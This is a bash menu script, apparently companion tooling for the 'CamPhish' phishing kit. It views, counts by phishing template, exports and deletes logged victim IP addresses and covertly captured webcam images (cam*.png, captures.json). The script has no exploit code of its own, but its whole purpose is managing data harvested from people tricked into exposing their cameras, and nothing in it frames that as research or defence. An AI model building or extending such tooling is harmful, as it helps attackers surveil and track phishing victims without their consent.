#!/bin/bash\n# CamN - Log Monitor & Manager\n# Usage: bash log_monitor.sh [command]\n\nBLUE='\\033[0;34m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nRED='\\033[0;31m'\nNC='\\033[0m' # No Color\n\necho -e \"${BLUE}╔════════════════════════════════════╗${NC}\"\necho -e \"${BLUE}║  CamN - Log Monitor & Manager      ║${NC}\"\necho -e \"${BLUE}╚════════════════════════════════════╝${NC}\"\necho \"\"\n\nshow_menu() {\n    echo -e \"${YELLOW}[1]${NC} View IP Log (Readable)\"\n    echo -e \"${YELLOW}[2]${NC} View IP Log (JSON)\"\n    echo -e \"${YELLOW}[3]${NC} View Camera Captures Log\"\n    echo -e \"${YELLOW}[4]${NC} View Captures JSON\"\n    echo -e \"${YELLOW}[5]${NC} Count Total Captures\"\n    echo -e \"${YELLOW}[6]${NC} Show Last 10 Activities\"\n    echo -e \"${YELLOW}[7]${NC} Export All Logs\"\n    echo -e \"${YELLOW}[8]${NC} Clean Old Logs (7 days+)\"\n    echo -e \"${YELLOW}[0]${NC} Exit\"\n    echo \"\"\n}\n\nview_ip_log() {\n    echo -e \"${GREEN}=== IP Access Log ===${NC}\"\n    if [ -f \"CamPhish/ip.txt\" ]; then\n        cat CamPhish/ip.txt\n    else\n        echo -e \"${RED}File not found: CamPhish/ip.txt${NC}\"\n    fi\n}\n\nview_ip_json() {\n    echo -e \"${GREEN}=== IP Access Log (JSON) ===${NC}\"\n    if [ -f \"CamPhish/ip.json\" ]; then\n        if command -v jq &> /dev/null; then\n            cat CamPhish/ip.json | jq '.'\n        else\n            cat CamPhish/ip.json\n        fi\n    else\n        echo -e \"${RED}File not found: CamPhish/ip.json${NC}\"\n    fi\n}\n\nview_captures_log() {\n    echo -e \"${GREEN}=== Camera Captures Log ===${NC}\"\n    if [ -f \"CamPhish/Log.log\" ]; then\n        cat CamPhish/Log.log\n    else\n        echo -e \"${RED}File not found: CamPhish/Log.log${NC}\"\n    fi\n}\n\nview_captures_json() {\n    echo -e \"${GREEN}=== Captures JSON ===${NC}\"\n    if [ -f \"CamPhish/captures.json\" ]; then\n        if command -v jq &> /dev/null; then\n            cat CamPhish/captures.json | jq '.'\n        else\n            cat CamPhish/captures.json\n        fi\n    else\n        echo -e \"${RED}File not found: CamPhish/captures.json${NC}\"\n    fi\n}\n\ncount_captures() {\n    echo -e \"${GREEN}=== Capture Statistics ===${NC}\"\n    \n    # Count from JSON\n    if [ -f \"CamPhish/captures.json\" ]; then\n        count=$(cat CamPhish/captures.json | grep -o '\"filename\"' | wc -l)\n        echo -e \"${YELLOW}Total Captures:${NC} $count\"\n        \n        # Show by template\n        echo -e \"\\n${YELLOW}By Template:${NC}\"\n        grep -o '\"template\": \"[^\"]*\"' CamPhish/captures.json | sort | uniq -c\n    else\n        echo -e \"${RED}No captures data available${NC}\"\n    fi\n    \n    # Count files\n    echo -e \"\\n${YELLOW}Image Files:${NC}\"\n    ls -lh CamPhish/cam*.png 2>/dev/null | wc -l\n}\n\nlast_activities() {\n    echo -e \"${GREEN}=== Last 10 Activities ===${NC}\"\n    \n    if [ -f \"CamPhish/ip.json\" ]; then\n        echo -e \"${YELLOW}Recent IP Access:${NC}\"\n        tail -20 CamPhish/ip.json | grep -o '\\[.*' || echo \"No IP data\"\n    fi\n    \n    echo \"\"\n    if [ -f \"CamPhish/captures.json\" ]; then\n        echo -e \"${YELLOW}Recent Captures:${NC}\"\n        tail -20 CamPhish/captures.json | grep -o '\\[.*' || echo \"No capture data\"\n    fi\n}\n\nexport_logs() {\n    timestamp=$(date +\"%Y%m%d_%H%M%S\")\n    export_dir=\"logs_export_$timestamp\"\n    \n    echo -e \"${GREEN}Creating export directory: $export_dir${NC}\"\n    mkdir -p \"$export_dir\"\n    \n    # Copy all log files\n    cp CamPhish/ip.txt \"$export_dir/\" 2>/dev/null && echo -e \"${GREEN}✓ Exported ip.txt${NC}\"\n    cp CamPhish/ip.json \"$export_dir/\" 2>/dev/null && echo -e \"${GREEN}✓ Exported ip.json${NC}\"\n    cp CamPhish/Log.log \"$export_dir/\" 2>/dev/null && echo -e \"${GREEN}✓ Exported Log.log${NC}\"\n    cp CamPhish/captures.json \"$export_dir/\" 2>/dev/null && echo -e \"${GREEN}✓ Exported captures.json${NC}\"\n    cp CamPhish/cam*.png \"$export_dir/\" 2>/dev/null && echo -e \"${GREEN}✓ Exported images${NC}\"\n    \n    # Create summary\n    echo \"\" > \"$export_dir/SUMMARY.txt\"\n    echo \"Export Timestamp: $(date)\" >> \"$export_dir/SUMMARY.txt\"\n    echo \"Total IPs: $(grep -c '\\[' CamPhish/ip.txt 2>/dev/null || echo 0)\" >> \"$export_dir/SUMMARY.txt\"\n    echo \"Total Captures: $(grep -c '\\[' CamPhish/Log.log 2>/dev/null || echo 0)\" >> \"$export_dir/SUMMARY.txt\"\n    \n    echo -e \"\\n${GREEN}Export complete: $export_dir/${NC}\"\n}\n\nclean_old_logs() {\n    echo -e \"${YELLOW}Warning: This will delete logs older than 7 days${NC}\"\n    read -p \"Continue? (y/N) \" -n 1 -r\n    echo\n    if [[ $REPLY =~ ^[Yy]$ ]]; then\n        find . -name \"*.png\" -type f -mtime +7 -delete && echo -e \"${GREEN}✓ Old images deleted${NC}\"\n        find . -name \"log*.txt\" -type f -mtime +7 -delete && echo -e \"${GREEN}✓ Old logs deleted${NC}\"\n        echo -e \"${GREEN}Cleanup complete${NC}\"\n    fi\n}\n\n# Main loop\nwhile true; do\n    show_menu\n    read -p \"Select option: \" choice\n    \n    case $choice in\n        1) view_ip_log ;;\n        2) view_ip_json ;;\n        3) view_captures_log ;;\n        4) view_captures_json ;;\n        5) count_captures ;;\n        6) last_activities ;;\n        7) export_logs ;;\n        8) clean_old_logs ;;\n        0) echo -e \"${GREEN}Goodbye!${NC}\"; exit 0 ;;\n        *) echo -e \"${RED}Invalid option${NC}\" ;;\n    esac\n    \n    echo \"\"\n    read -p \"Press Enter to continue...\"\n    clear\ndone\n